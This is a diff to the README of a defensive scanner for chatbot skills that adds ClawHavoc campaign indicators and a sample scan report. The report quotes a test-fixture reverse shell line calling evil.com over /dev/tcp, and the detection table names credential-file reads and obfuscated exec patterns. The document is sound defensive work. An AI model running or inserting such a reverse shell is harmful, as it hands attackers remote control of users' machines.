@@ -2,7 +2,7 @@
 
 **Security Scanner for OpenClaw/Clawdbot Skills**
 
-Protect yourself from malicious skill installations. ClawGuard scans skills for dangerous patterns before you install them.
+Protect yourself from malicious skill installations. ClawGuard scans skills for dangerous patterns before you install them - including patterns from the **ClawHavoc campaign** (341 malicious skills discovered by Koi Security).
 
 ## Quick Start
 
@@ -29,6 +29,7 @@ python scan.py --all
 | 🔴 **Data Exfiltration** | requests.post() to suspicious TLDs | Critical |
 | 🔴 **Credential Harvest** | Reading ~/.ssh/id_rsa, AWS credentials | Critical |
 | 🔴 **Obfuscation** | base64.b64decode(exec), chr() chains | Critical |
+| 🔴 **ClawHavoc IOCs** | glot.io scripts, fake Apple URLs, known C2 IPs | Critical |
 | 🟠 **Code Execution** | exec(), eval(), subprocess | High |
 | 🟡 **Suspicious Network** | URL shorteners, weird ports | Medium |
 | 🟡 **Environment Access** | os.environ, os.getenv | Medium |
@@ -63,14 +64,30 @@ python scan.py --skill github --format markdown
 ╔══════════════════════════════════════════════════════════════╗
 ║                    ClawGuard Scan Report                     ║
 ╠══════════════════════════════════════════════════════════════╣
-║ Skill:     suspicious-skill                                  ║
-║ Risk:      100/100 [CRITICAL] ████████████████████          ║
+║ Skill:     malicious_skill_revshell                          ║
+║ Path:      tests/fixtures/malicious_skill_revshell           ║
+║ Files:     2 files, 38 lines                                 ║
+║ Risk:      100/100 [CRITICAL] ████████████████████           ║
 ╚══════════════════════════════════════════════════════════════╝
 
-CRITICAL   [CH-002] Subprocess spawning a shell
+CRITICAL   [CH-002] Subprocess spawning a shell - high likelihood of reverse shell
 ├── File: main.py:17
 ├── Code: subprocess.call(["/bin/bash", "-i"])
+├── Category: remote_access
+├── Confidence: high
 └── Action: DO NOT INSTALL. This skill contains dangerous code.
+
+CRITICAL   [CH-003] System call with netcat or interactive bash
+├── File: main.py:22
+├── Code: os.system('bash -i >& /dev/tcp/evil.com/9001 0>&1')
+├── Category: remote_access
+├── Confidence: high
+└── Action: DO NOT INSTALL. This skill contains dangerous code.
+
+────────────────────────────────────────────────────────────────
+Summary: 4 critical, 4 high, 1 medium
+Recommendation: DO NOT INSTALL — Critical findings detected
+────────────────────────────────────────────────────────────────
 ```
 
 ## Project Structure
@@ -83,31 +100,38 @@ clawguard/
 │   ├── pattern_matcher.py  # Regex IOC matching
 │   ├── ast_analyzer.py     # Python AST analysis
 │   ├── network_analyzer.py # URL/IP detection
-│   └── obfuscation_detector.py
+│   ├── obfuscation_detector.py
+│   └── permission_checker.py
 ├── reporters/
 │   ├── console_reporter.py
 │   ├── json_reporter.py
 │   └── markdown_reporter.py
 ├── iocs/
-│   └── clawhavoc_indicators.json  # 50 IOC patterns
+│   └── clawhavoc_indicators.json  # 70+ IOC patterns
 └── tests/
     └── fixtures/           # Test skills
 ```
 
 ## IOC Database
 
-50 indicators of compromise across categories:
+70+ indicators of compromise across categories:
 - Remote access (reverse shells, C2)
 - Data exfiltration
 - Credential harvesting
 - Code execution
 - Obfuscation techniques
 - Network anomalies
+- **Real ClawHavoc campaign IOCs** (from Koi Security research)
+- Known malicious IPs, hashes, and skill names
 
 ## Requirements
 
 - Python 3.8+
 - No external dependencies (stdlib only)
+
+## Credits
+
+IOCs enriched with research from [Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) - ClawHavoc campaign analysis by Oren Yomtov and Alex.
 
 ## License
 
